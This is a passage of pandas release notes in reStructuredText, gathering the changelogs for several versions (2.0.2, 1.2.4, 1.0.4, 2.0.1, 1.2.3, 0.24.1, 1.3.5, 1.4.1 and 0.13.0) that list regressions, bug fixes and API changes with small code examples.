:meth:`DataFrame.__getitem__` not preserving dtypes for :class:`MultiIndex` partial keys (:issue:`51895`)\n- Bug in :meth:`DataFrame.convert_dtypes` ignores ``convert_*`` keywords when set to False ``dtype_backend=\"pyarrow\"`` (:issue:`52872`)\n- Bug in :meth:`DataFrame.convert_dtypes` losing timezone for tz-aware dtypes and ``dtype_backend=\"pyarrow\"`` (:issue:`53382`)\n- Bug in :meth:`DataFrame.sort_values` raising for PyArrow ``dictionary`` dtype (:issue:`53232`)\n- Bug in :meth:`Series.describe` treating pyarrow-backed timestamps and timedeltas as categorical data (:issue:`53001`)\n- Bug in :meth:`Series.rename` not making a lazy copy when Copy-on-Write is enabled when a scalar is passed to it (:issue:`52450`)\n- Bug in :meth:`pd.array` raising for ``NumPy`` array and ``pa.large_string`` or ``pa.large_binary`` (:issue:`52590`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_202.other:\n\nOther\n~~~~~\n- Raised a better error message when calling :func:`Series.dt.to_pydatetime` with :class:`ArrowDtype` with ``pyarrow.date32`` or ``pyarrow.date64`` type (:issue:`52812`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_202.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.0.1..v2.0.2\n\n\n.. _whatsnew_124:\n\nWhat's new in 1.2.4 (April 12, 2021)\n------------------------------------\n\nThese are the changes in pandas 1.2.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_124.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :meth:`DataFrame.sum` when ``min_count`` greater than the :class:`DataFrame` shape was passed resulted in a ``ValueError`` (:issue:`39738`)\n- Fixed regression in :meth:`DataFrame.to_json` raising ``AttributeError`` when run on PyPy (:issue:`39837`)\n- Fixed regression in (in)equality comparison of ``pd.NaT`` with a non-datetimelike numpy array returning a scalar instead of an array (:issue:`40722`)\n- Fixed regression in :meth:`DataFrame.where` not returning a copy in the case of an all True condition (:issue:`39595`)\n- Fixed regression in :meth:`DataFrame.replace` raising ``IndexError`` when ``regex`` was a multi-key dictionary (:issue:`39338`)\n- Fixed regression in repr of floats in an ``object`` column not respecting ``float_format`` when printed in the console or outputted through :meth:`DataFrame.to_string`, :meth:`DataFrame.to_html`, and :meth:`DataFrame.to_latex` (:issue:`40024`)\n- Fixed regression in NumPy ufuncs such as ``np.add`` not passing through all arguments for :class:`DataFrame` (:issue:`40662`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_124.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.2.3..v1.2.4\n\n\n\n.. _whatsnew_104:\n\nWhat's new in 1.0.4 (May 28, 2020)\n------------------------------------\n\nThese are the changes in pandas 1.0.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_104.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fix regression where :meth:`Series.isna` and :meth:`DataFrame.isna` would raise for categorical dtype when ``pandas.options.mode.use_inf_as_na`` was set to ``True`` (:issue:`33594`)\n- Fix regression in :meth:`.DataFrameGroupBy.first`, :meth:`.SeriesGroupBy.first`, :meth:`.DataFrameGroupBy.last`, and :meth:`.SeriesGroupBy.last` where None is not preserved in object dtype (:issue:`32800`)\n- Fix regression in DataFrame reductions using ``numeric_only=True`` and ExtensionArrays (:issue:`33256`).\n- Fix performance regression in ``memory_usage(deep=True)`` for object dtype (:issue:`33012`)\n- Fix regression where :meth:`Categorical.replace` would replace with ``NaN`` whenever the new value and replacement value were equal (:issue:`33288`)\n- Fix regression where an ordered :class:`Categorical` containing only ``NaN`` values would raise rather than returning ``NaN`` when taking the minimum or maximum  (:issue:`33450`)\n- Fix regression in :meth:`DataFrameGroupBy.agg` with dictionary input losing ``ExtensionArray`` dtypes (:issue:`32194`)\n- Fix to preserve the ability to index with the \"nearest\" method with xarray's CFTimeIndex, an :class:`Index` subclass (`pydata/xarray3751 <https://github.com/pydata/xarray/issues/3751>`_, :issue:`32905`).\n- Fix regression in :meth:`DataFrame.describe` raising ``TypeError: unhashable type: 'dict'`` (:issue:`32409`)\n- Fix regression in :meth:`DataFrame.replace` casts columns to ``object`` dtype if items in ``to_replace`` not in values (:issue:`32988`)\n- Fix regression in :meth:`Series.groupby` would raise ``ValueError`` when grouping by :class:`PeriodIndex` level (:issue:`34010`)\n- Fix regression in :meth:`DataFrameGroupBy.rolling.apply` and :meth:`SeriesGroupBy.rolling.apply` ignoring args and kwargs parameters (:issue:`33433`)\n- Fix regression in error message with ``np.min`` or ``np.max`` on unordered :class:`Categorical` (:issue:`33115`)\n- Fix regression in :meth:`DataFrame.loc` and :meth:`Series.loc` throwing an error when a ``datetime64[ns, tz]`` value is provided (:issue:`32395`)\n\n.. _whatsnew_104.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :meth:`SeriesGroupBy.first`, :meth:`SeriesGroupBy.last`, :meth:`SeriesGroupBy.min`, and :meth:`SeriesGroupBy.max` returning floats when applied to nullable Booleans (:issue:`33071`)\n- Bug in :meth:`Rolling.min` and :meth:`Rolling.max`: Growing memory usage after multiple calls when using a fixed window (:issue:`30726`)\n- Bug in :meth:`~DataFrame.to_parquet` was not raising ``PermissionError`` when writing to a private s3 bucket with invalid creds. (:issue:`27679`)\n- Bug in :meth:`~DataFrame.to_csv` was silently failing when writing to an invalid s3 bucket. (:issue:`32486`)\n- Bug in :meth:`read_parquet` was raising a ``FileNotFoundError`` when passed an s3 directory path. (:issue:`26388`)\n- Bug in :meth:`~DataFrame.to_parquet` was throwing an ``AttributeError`` when writing a partitioned parquet file to s3 (:issue:`27596`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` causes the quantiles to be shifted when the ``by`` axis contains ``NaN`` (:issue:`33200`, :issue:`33569`)\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.0.3..v1.0.4\n\n\n.. _whatsnew_201:\n\nWhat's new in 2.0.1 (April 24, 2023)\n------------------------------------\n\nThese are the changes in pandas 2.0.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_201.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression for subclassed Series when constructing from a dictionary (:issue:`52445`)\n- Fixed regression in :meth:`.SeriesGroupBy.agg` failing when grouping with categorical data, multiple groupings, ``as_index=False``, and a list of aggregations (:issue:`52760`)\n- Fixed regression in :meth:`DataFrame.pivot` changing :class:`Index` name of input object (:issue:`52629`)\n- Fixed regression in :meth:`DataFrame.resample` raising on a DataFrame with no columns (:issue:`52484`)\n- Fixed regression in :meth:`DataFrame.sort_values` not resetting index when :class:`DataFrame` is already sorted and ``ignore_index=True`` (:issue:`52553`)\n- Fixed regression in :meth:`MultiIndex.isin` raising ``TypeError`` for ``Generator`` (:issue:`52568`)\n- Fixed regression in :meth:`Series.describe` showing ``RuntimeWarning`` for extension dtype :class:`Series` with one element (:issue:`52515`)\n- Fixed regression when adding a new column to a :class:`DataFrame` when the :attr:`DataFrame.columns` was a :class:`RangeIndex` and the new key was hashable but not a scalar (:issue:`52652`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_201.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :attr:`Series.dt.days` that would overflow ``int32`` number of days (:issue:`52391`)\n- Bug in :class:`arrays.DatetimeArray` constructor returning an incorrect unit when passed a non-nanosecond numpy datetime array (:issue:`52555`)\n- Bug in :class:`~arrays.ArrowExtensionArray` with duration dtype overflowing when constructed from data containing numpy ``NaT`` (:issue:`52843`)\n- Bug in :func:`Series.dt.round` when passing a ``freq`` of equal or higher resolution compared to the :class:`Series` would raise a ``ZeroDivisionError`` (:issue:`52761`)\n- Bug in :func:`Series.median` with :class:`ArrowDtype` returning an approximate median (:issue:`52679`)\n- Bug in :func:`api.interchange.from_dataframe` was unnecessarily raising on categorical dtypes (:issue:`49889`)\n- Bug in :func:`api.interchange.from_dataframe` was unnecessarily raising on large string dtypes (:issue:`52795`)\n- Bug in :func:`pandas.testing.assert_series_equal` where ``check_dtype=False`` would still raise for datetime or timedelta types with different resolutions (:issue:`52449`)\n- Bug in :func:`read_csv` casting PyArrow datetimes to NumPy when ``dtype_backend=\"pyarrow\"`` and ``parse_dates`` is set causing a performance bottleneck in the process (:issue:`52546`)\n- Bug in :func:`to_datetime` and :func:`to_timedelta` when trying to convert numeric data with a :class:`ArrowDtype` (:issue:`52425`)\n- Bug in :func:`to_numeric` with ``errors='coerce'`` and ``dtype_backend='pyarrow'`` with :class:`ArrowDtype` data (:issue:`52588`)\n- Bug in :meth:`ArrowDtype.__from_arrow__` not respecting if dtype is explicitly given (:issue:`52533`)\n- Bug in :meth:`DataFrame.describe` not respecting ``ArrowDtype`` in ``include`` and ``exclude`` (:issue:`52570`)\n- Bug in :meth:`DataFrame.max` and related casting different :class:`Timestamp` resolutions always to nanoseconds (:issue:`52524`)\n- Bug in :meth:`Series.describe` not returning :class:`ArrowDtype` with ``pyarrow.float64`` type with numeric data (:issue:`52427`)\n- Bug in :meth:`Series.dt.tz_localize` incorrectly localizing timestamps with :class:`ArrowDtype` (:issue:`52677`)\n- Bug in arithmetic between ``np.datetime64`` and ``np.timedelta64`` ``NaT`` scalars with units always returning nanosecond resolution (:issue:`52295`)\n- Bug in logical and comparison operations between :class:`ArrowDtype` and numpy masked types (e.g. ``\"boolean\"``) (:issue:`52625`)\n- Fixed bug in :func:`merge` when merging with ``ArrowDtype`` one one and a NumPy dtype on the other side (:issue:`52406`)\n- Fixed segfault in :meth:`Series.to_numpy` with ``null[pyarrow]`` dtype (:issue:`52443`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_201.other:\n\nOther\n~~~~~\n- :class:`DataFrame` created from empty dicts had :attr:`~DataFrame.columns`  of dtype ``object``. It is now a :class:`RangeIndex` (:issue:`52404`)\n- :class:`Series` created from empty dicts had :attr:`~Series.index`  of dtype ``object``. It is now a :class:`RangeIndex` (:issue:`52404`)\n- Implemented :meth:`Series.str.split` and :meth:`Series.str.rsplit` for :class:`ArrowDtype` with ``pyarrow.string`` (:issue:`52401`)\n- Implemented most ``str`` accessor methods for :class:`ArrowDtype` with ``pyarrow.string`` (:issue:`52401`)\n- Supplying a non-integer hashable key that tests ``False`` in :func:`api.types.is_scalar` now raises a ``KeyError`` for :meth:`RangeIndex.get_loc`, like it does for :meth:`Index.get_loc`. Previously it raised an ``InvalidIndexError`` (:issue:`52652`).\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_201.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.0.0..v2.0.1\n\n\n.. _whatsnew_123:\n\nWhat's new in 1.2.3 (March 02, 2021)\n------------------------------------\n\nThese are the changes in pandas 1.2.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_123.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :meth:`~DataFrame.to_excel` raising ``KeyError`` when giving duplicate columns with ``columns`` attribute (:issue:`39695`)\n- Fixed regression in nullable integer unary ops propagating mask on assignment (:issue:`39943`)\n- Fixed regression in :meth:`DataFrame.__setitem__` not aligning :class:`DataFrame` on right-hand side for boolean indexer (:issue:`39931`)\n- Fixed regression in :meth:`~DataFrame.to_json` failing to use ``compression`` with URL-like paths that are internally opened in binary mode or with user-provided file objects that are opened in binary mode (:issue:`39985`)\n- Fixed regression in :meth:`Series.sort_index` and :meth:`DataFrame.sort_index`, which exited with an ungraceful error when having kwarg ``ascending=None`` passed. Passing ``ascending=None`` is still considered invalid, and the improved error message suggests a proper usage (``ascending`` must be a boolean or a list-like of boolean) (:issue:`39434`)\n- Fixed regression in :meth:`DataFrame.transform` and :meth:`Series.transform` giving incorrect column labels when passed a dictionary with a mix of list and non-list values (:issue:`40018`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_123.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.2.2..v1.2.3\n\n\n.. _whatsnew_0241:\n\nWhat's new in 0.24.1 (February 3, 2019)\n---------------------------------------\n\n.. warning::\n\n   The 0.24.x series of releases will be the last to support Python 2. Future feature\n   releases will support Python 3 only. See `Dropping Python 2.7 <https://pandas.pydata.org/pandas-docs/version/0.24/install.html#install-dropping-27>`_ for more.\n\n{{ header }}\n\nThese are the changes in pandas 0.24.1. See :ref:`release` for a full changelog\nincluding other versions of pandas. See :ref:`whatsnew_0240` for the 0.24.0 changelog.\n\n.. _whatsnew_0241.api:\n\nAPI changes\n~~~~~~~~~~~\n\nChanging the ``sort`` parameter for :class:`Index` set operations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe default ``sort`` value for :meth:`Index.union` has changed from ``True`` to ``None`` (:issue:`24959`).\nThe default *behavior*, however, remains the same: the result is sorted, unless\n\n1. ``self`` and ``other`` are identical\n2. ``self`` or ``other`` is empty\n3. ``self`` or ``other`` contain values that can not be compared (a ``RuntimeWarning`` is raised).\n\nThis change will allow ``sort=True`` to mean \"always sort\" in a future release.\n\nThe same change applies to :meth:`Index.difference` and :meth:`Index.symmetric_difference`, which\nwould not sort the result when the values could not be compared.\n\nThe ``sort`` option for :meth:`Index.intersection` has changed in three ways.\n\n1. The default has changed from ``True`` to ``False``, to restore the\n   pandas 0.23.4 and earlier behavior of not sorting by default.\n2. The behavior of ``sort=True`` can now be obtained with ``sort=None``.\n   This will sort the result only if the values in ``self`` and ``other``\n   are not identical.\n3. The value ``sort=True`` is no longer allowed. A future version of pandas\n   will properly support ``sort=True`` meaning \"always sort\".\n\n.. _whatsnew_0241.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :meth:`DataFrame.to_dict` with ``records`` orient raising an\n  ``AttributeError`` when the ``DataFrame`` contained more than 255 columns, or\n  wrongly converting column names that were not valid python identifiers (:issue:`24939`, :issue:`24940`).\n- Fixed regression in :func:`read_sql` when passing certain queries with MySQL/pymysql (:issue:`24988`).\n- Fixed regression in :class:`Index.intersection` incorrectly sorting the values by default (:issue:`24959`).\n- Fixed regression in :func:`merge` when merging an empty ``DataFrame`` with multiple timezone-aware columns on one of the timezone-aware columns (:issue:`25014`).\n- Fixed regression in :meth:`Series.rename_axis` and :meth:`DataFrame.rename_axis` where passing ``None`` failed to remove the axis name (:issue:`25034`)\n- Fixed regression in :func:`to_timedelta` with ``box=False`` incorrectly returning a ``datetime64`` object instead of a ``timedelta64`` object (:issue:`24961`)\n- Fixed regression where custom hashable types could not be used as column keys in :meth:`DataFrame.set_index` (:issue:`24969`)\n\n.. _whatsnew_0241.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n**Reshaping**\n\n- Bug in :meth:`DataFrame.groupby` with :class:`Grouper` when there is a time change (DST) and grouping frequency is ``'1d'`` (:issue:`24972`)\n\n**Visualization**\n\n- Fixed the warning for implicitly registered matplotlib converters not showing. See :ref:`whatsnew_0211.converters` for more (:issue:`24963`).\n\n**Other**\n\n- Fixed AttributeError when printing a DataFrame's HTML repr after accessing the IPython config object (:issue:`25036`)\n\n.. _whatsnew_0.241.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. Including the contributors hardcoded for this release, as backporting with\n   MeeseeksDev loses the commit authors\n\nA total of 7 people contributed patches to this release. People with a \"+\" by their names contributed a patch for the first time.\n\n* Alex Buchkovsky\n* Roman Yurchak\n* h-vetinari\n* jbrockmendel\n* Jeremy Schendel\n* Joris Van den Bossche\n* Tom Augspurger\n\n\n.. _whatsnew_135:\n\nWhat's new in 1.3.5 (December 12, 2021)\n---------------------------------------\n\nThese are the changes in pandas 1.3.5. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_135.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`Series.equals` when comparing floats with dtype object to None (:issue:`44190`)\n- Fixed regression in :func:`merge_asof` raising error when array was supplied as join key (:issue:`42844`)\n- Fixed regression when resampling :class:`DataFrame` with :class:`DateTimeIndex` with empty groups and ``uint8``, ``uint16`` or ``uint32`` columns incorrectly raising ``RuntimeError`` (:issue:`43329`)\n- Fixed regression in creating a :class:`DataFrame` from a timezone-aware :class:`Timestamp` scalar near a Daylight Savings Time transition (:issue:`42505`)\n- Fixed performance regression in :func:`read_csv` (:issue:`44106`)\n- Fixed regression in :meth:`Series.duplicated` and :meth:`Series.drop_duplicates` when Series has :class:`Categorical` dtype with boolean categories (:issue:`44351`)\n- Fixed regression in :meth:`.DataFrameGroupBy.sum` and :meth:`.SeriesGroupBy.sum` with ``timedelta64[ns]`` dtype containing ``NaT`` failing to treat that value as NA (:issue:`42659`)\n- Fixed regression in :meth:`.RollingGroupby.cov` and :meth:`.RollingGroupby.corr` when ``other`` had the same shape as each group would incorrectly return superfluous groups in the result (:issue:`42915`)\n\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_135.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.4..v1.3.5|HEAD\n\n\n.. _whatsnew_141:\n\nWhat's new in 1.4.1 (February 12, 2022)\n---------------------------------------\n\nThese are the changes in pandas 1.4.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_141.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Regression in :meth:`Series.mask` with ``inplace=True`` and ``PeriodDtype`` and an incompatible ``other`` coercing to a common dtype instead of raising (:issue:`45546`)\n- Regression in :func:`.assert_frame_equal` not respecting ``check_flags=False`` (:issue:`45554`)\n- Regression in :meth:`DataFrame.loc` raising ``ValueError`` when indexing (getting values) on a :class:`MultiIndex` with one level (:issue:`45779`)\n- Regression in :meth:`Series.fillna` with ``downcast=False`` incorrectly downcasting ``object`` dtype (:issue:`45603`)\n- Regression in :func:`api.types.is_bool_dtype` raising an ``AttributeError`` when evaluating a categorical :class:`Series` (:issue:`45615`)\n- Regression in :meth:`DataFrame.iat` setting values leading to not propagating correctly in subsequent lookups (:issue:`45684`)\n- Regression when setting values with :meth:`DataFrame.loc` losing :class:`Index` name if :class:`DataFrame` was empty before (:issue:`45621`)\n- Regression in :meth:`~Index.join` with overlapping :class:`IntervalIndex` raising an ``InvalidIndexError`` (:issue:`45661`)\n- Regression when setting values with :meth:`Series.loc` raising with all ``False`` indexer and :class:`Series` on the right hand side (:issue:`45778`)\n- Regression in :func:`read_sql` with a DBAPI2 connection that is not an instance of ``sqlite3.Connection`` incorrectly requiring SQLAlchemy be installed (:issue:`45660`)\n- Regression in :class:`DateOffset` when constructing with an integer argument with no keywords (e.g. ``pd.DateOffset(n)``) would behave like ``datetime.timedelta(days=0)`` (:issue:`45643`, :issue:`45890`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_141.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed segfault in :meth:`DataFrame.to_json` when dumping tz-aware datetimes in Python 3.10 (:issue:`42130`)\n- Stopped emitting unnecessary ``FutureWarning`` in :meth:`DataFrame.sort_values` with sparse columns (:issue:`45618`)\n- Fixed window aggregations in :meth:`DataFrame.rolling` and :meth:`Series.rolling` to skip over unused elements (:issue:`45647`)\n- Fixed builtin highlighters in :class:`.Styler` to be responsive to ``NA`` with nullable dtypes (:issue:`45804`)\n- Bug in :meth:`~Rolling.apply` with ``axis=1`` raising an erroneous ``ValueError`` (:issue:`45912`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_141.other:\n\nOther\n~~~~~\n- Reverted performance speedup of :meth:`DataFrame.corr` for ``method=pearson`` to fix precision regression (:issue:`45640`, :issue:`42761`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_141.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.4.0..v1.4.1\n\n\n.. _whatsnew_0130:\n\nVersion 0.13.0 (January 3, 2014)\n--------------------------------\n\n{{ header }}\n\n\n\nThis is a major release from 0.12.0 and includes a number of API changes, several new features and\nenhancements along with a large number of bug fixes.\n\nHighlights include:\n\n- support for a new index type ``Float64Index``, and other Indexing enhancements\n- ``HDFStore`` has a new string based syntax for query specification\n- support for new methods of interpolation\n- updated ``timedelta`` operations\n- a new string manipulation method ``extract``\n- Nanosecond support for Offsets\n- ``isin`` for DataFrames\n\nSeveral experimental features are added, including:\n\n- new ``eval/query`` methods for expression evaluation\n- support for ``msgpack`` serialization\n- an i/o interface to Google's ``BigQuery``\n\nTheir are several new or updated docs sections including:\n\n- :ref:`Comparison with SQL<compare_with_sql>`, which should be useful for those familiar with SQL but still learning pandas.\n- :ref:`Comparison with R<compare_with_r>`, idiom translations from R to pandas.\n- :ref:`Enhancing Performance<enhancingperf>`, ways to enhance pandas performance with ``eval/query``.\n\n.. warning::\n\n   In 0.13.0 ``Series`` has internally been refactored to no longer sub-class ``ndarray``\n   but instead subclass ``NDFrame``, similar to the rest of the pandas containers. This should be\n   a transparent change with only very limited API implications. See :ref:`Internal Refactoring<whatsnew_0130.refactoring>`\n\nAPI changes\n~~~~~~~~~~~\n\n- ``read_excel`` now supports an integer in its ``sheetname`` argument giving\n  the index of the sheet to read in (:issue:`4301`).\n- Text parser now treats anything that reads like inf (\"inf\", \"Inf\", \"-Inf\",\n  \"iNf\", etc.) as infinity. (:issue:`4220`, :issue:`4219`), affecting\n  ``read_table``, ``read_csv``, etc.\n- ``pandas`` now is Python 2/3 compatible without the need for 2to3 thanks to\n  jtratner. As a result, pandas now uses iterators more extensively. This\n  also led to the introduction of substantive parts of the Benjamin\n  Peterson's ``six`` library into compat. (:issue:`4384`, :issue:`4375`,\n  :issue:`4372`)\n- ``pandas.util.compat`` and ``pandas.util.py3compat`` have been merged into\n  ``pandas.compat``. ``pandas.compat`` now includes many functions allowing\n  2/3 compatibility. It contains both list and iterator versions of range,\n  filter, map and zip, plus other necessary elements for Python 3\n  compatibility. ``lmap``, ``lzip``, ``lrange`` and ``lfilter`` all produce\n  lists instead of iterators, for compatibility with ``numpy``, subscripting\n  and ``pandas`` constructors.(:issue:`4384`, :issue:`4375`, :issue:`4372`)\n- ``Series.get`` with negative indexers now returns the same as ``[]`` (:issue:`4390`)\n- Changes to how ``Index`` and ``MultiIndex`` handle metadata (``levels``,\n  ``labels``, and ``names``) (:issue:`4039`):\n\n  .. code-block:: python\n\n      previously, you would have set levels or labels directly\n     >>> pd.index.levels = [[1, 2, 3, 4], [1, 2, 4, 4]]\n\n      now, you use the set_levels or set_labels methods\n     >>> index = pd.index.set_levels([[1, 2, 3, 4], [1, 2, 4, 4]])\n\n      similarly, for names, you can rename the object\n      but setting names is not deprecated\n     >>> index = pd.index.set_names([\"bob\", \"cranberry\"])\n\n      and all methods take an inplace kwarg - but return None\n     >>> pd.index.set_names([\"bob\", \"cranberry\"], inplace=True)\n\n- **All** division with ``NDFrame`` objects is now *truedivision*, regardless\n  of the future import. This means that operating on pandas objects will by default\n  use *floating point* division, and return a floating point dtype.\n  You can use ``//`` and ``floordiv`` to do integer division.\n\n  Integer division\n\n  .. code-block:: ipython\n\n     In [3]: arr = np.array([1, 2, 3, 4])\n\n     In [4]: arr2 = np.array([5, 3, 2, 1])\n\n     In [5]: arr / arr2\n     Out[5]: array([0, 0, 1, 4])\n\n     In [6]: pd.Series(arr) // pd.Series(arr2)\n     Out[6]:\n     0    0\n     1    0\n     2    1\n     3    4\n     dtype: int64\n\n  True Division\n\n  .. code-block:: ipython\n\n      In [7]: pd.Series(arr) / pd.Series(arr2)   no future import required\n      Out[7]:\n      0    0.200000\n      1    0.666667\n      2    1.500000\n      3    4.000000\n      dtype: float64\n\n- Infer and downcast dtype if ``downcast='infer'`` is passed to ``fillna/ffill/bfill`` (:issue:`4604`)\n- ``__nonzero__`` for all NDFrame objects, will now raise a ``ValueError``, this reverts back to (:issue:`1073`, :issue:`4633`)\n  behavior. See :ref:`gotchas<gotchas.truth>` for a more detailed discussion.\n\n  This prevents doing boolean comparison on *entire* pandas objects, which is inherently ambiguous. These all will raise a ``ValueError``.\n\n  .. code-block:: python\n\n     >>> df = pd.DataFrame({'A': np.random.randn(10),\n     ...                    'B': np.random.randn(10),\n     ...                    'C': pd.date_range('20130101', periods=10)\n     ...                    })\n     ...\n     >>> if df:\n     ...     pass\n     ...\n     Traceback (most recent call last):\n         ...\n     ValueError: The truth value of a DataFrame is ambiguous.  Use a.empty,\n     a.bool(), a.item(), a.any() or a.all().\n\n     >>> df1 = df\n     >>> df2 = df\n     >>> df1 and df2\n     Traceback (most recent call last):\n         ...\n     ValueError: The truth value of a DataFrame is ambiguous.  Use a.empty,\n     a.bool(), a.item(), a.any() or a.all().\n\n     >>> d = [1, 2, 3]\n     >>> s1 = pd.Series(d)\n     >>> s2 = pd.Series(d)\n     >>> s1 and s2\n     Traceback (most recent call last):\n         ...\n     ValueError: The truth value of a DataFrame is ambiguous.  Use a.empty,\n     a.bool(), a.item(), a.any() or a.all().\n\n  Added the ``.bool()`` method to ``NDFrame`` objects to facilitate evaluating of single-element boolean Series:\n\n  .. code-block:: python\n\n     >>> pd.Series([True]).bool()\n      True\n     >>> pd.Series([False]).bool()\n      False\n     >>> pd.DataFrame([[True]]).bool()\n      True\n     >>> pd.DataFrame([[False]]).bool()\n      False\n\n- All non-Index NDFrames (``Series``, ``DataFrame``, ``Panel``, ``Panel4D``,\n  ``SparsePanel``, etc.), now support the entire set of arithmetic operators\n  and arithmetic flex methods (add, sub, mul, etc.). ``SparsePanel`` does not\n  support ``pow`` or ``mod`` with non-scalars. (:issue:`3765`)\n- ``Series`` and ``DataFrame`` now have a ``mode()`` method to calculate the\n  statistical mode(s) by axis/Series. (:issue:`5367`)\n\n- Chained assignment will now by default warn if the user is assigning to a copy. This can be changed\n  with the option ``mode.chained_assignment``, allowed options are ``raise/warn/None``. See :ref:`the docs<indexing.view_versus_copy>`.\n\n  .. ipython:: python\n\n     dfc = pd.DataFrame({'A': ['aaa', 'bbb', 'ccc'], 'B': [1, 2, 3]})\n     pd.set_option('chained_assignment', 'warn')\n\n  The following warning / exception will show if this is attempted.\n\n  .. ipython:: python\n     :okwarning:\n\n     dfc.loc[0]['A'] = 1111\n\n  ::\n\n     Traceback (most recent call last)\n        ...\n     SettingWithCopyWarning:\n        A value is trying to be set on a copy of a slice from a DataFrame.\n        Try using .loc[row_index,col_indexer] = value instead\n\n  Here is the correct method of assignment.\n\n  .. ipython:: python\n\n     dfc.loc[0, 'A'] = 11\n     dfc\n\n- ``Panel.reindex`` has the following call signature ``Panel.reindex(items=None, major_axis=None, minor_axis=None, **kwargs)``\n   to conform with other ``NDFrame`` objects. See :ref:`Internal Refactoring<whatsnew_0130.refactoring>` for more information.\n\n- ``Series.argmin`` and ``Series.argmax`` are now aliased to ``Series.idxmin`` and ``Series.idxmax``. These return the *index* of the\n   min or max element respectively. Prior to 0.13.0 these would return the position of the min / max element. (:issue:`6214`)\n\nPrior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThese were announced changes in 0.12 or prior that are taking effect as of 0.13.0\n\n- Remove deprecated ``Factor`` (:issue:`3650`)\n- Remove deprecated ``set_printoptions/reset_printoptions`` (:issue:`3046`)\n- Remove deprecated ``_verbose_info`` (:issue:`3215`)\n- Remove deprecated ``read_clipboard/to_clipboard/ExcelFile/ExcelWriter`` from ``pandas.io.parsers`` (:issue:`3717`)\n  These are available as functions in the main pandas namespace (e.g. ``pd.read_clipboard``)\n- default for ``tupleize_cols`` is now ``False`` for both ``to_csv`` and ``read_csv``. Fair warning in 0.12 (:issue:`3604`)\n- default for ``display.max_seq_len`` is now 100 rather than ``None``. This activates\n  truncated display (\"...\") of long sequences in various places. (:issue:`3391`)\n\nDeprecations\n~~~~~~~~~~~~\n\nDeprecated in 0.13.0\n\n- deprecated ``iterkv``, which will be removed in a future release (this was\n  an alias of iteritems used to bypass ``2to3``'s changes).\n  (:issue:`4384`, :issue:`4375`, :issue:`4372`)\n- deprecated the string method ``match``, whose role is now performed more\n  idiomatically by ``extract``. In a future release, the default behavior\n  of ``match`` will change to become analogous to ``contains``, which returns\n  a boolean indexer. (Their\n  distinction is strictness: ``match`` relies on ``re.match`` while\n  ``contains`` relies on ``re.search``.) In this release, the deprecated\n  behavior is the default, but the new behavior is available through the\n  keyword argument ``as_indexer=True``.\n\nIndexing API changes\n~~~~~~~~~~~~~~~~~~~~\n\nPrior to 0.13, it was impossible to use a label indexer (``.loc/.ix``) to set a value that\nwas not contained in the index of a particular axis. (:issue:`2578`). See :ref:`the docs<indexing.basics.partial_setting>`\n\nIn the ``Series`` case this is effectively an appending operation\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, 3])\n   s\n   s[5] = 5.\n   s\n\n.. ipython:: python\n\n   dfi = pd.DataFrame(np.arange(6).reshape(3, 2),\n                      columns=['A', 'B'])\n   dfi\n\nThis would previously ``KeyError``\n\n.. ipython:: python\n\n   dfi.loc[:, 'C'] = dfi.loc[:, 'A']\n   dfi\n\nThis is like an ``append`` operation.\n\n.. ipython:: python\n\n   dfi.loc[3] = 5\n   dfi\n\nA Panel setting operation on an arbitrary axis aligns the input to the Panel\n\n.. code-block:: ipython\n\n   In [20]: p = 